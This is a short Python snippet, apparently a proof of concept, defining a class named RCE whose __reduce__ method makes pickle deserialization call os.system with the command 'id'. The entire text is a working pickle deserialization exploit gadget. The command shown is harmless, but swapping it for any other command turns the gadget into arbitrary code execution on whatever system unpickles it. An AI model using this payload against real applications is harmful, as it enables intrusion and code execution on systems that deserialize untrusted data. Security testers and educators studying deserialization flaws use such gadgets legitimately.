import os


class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
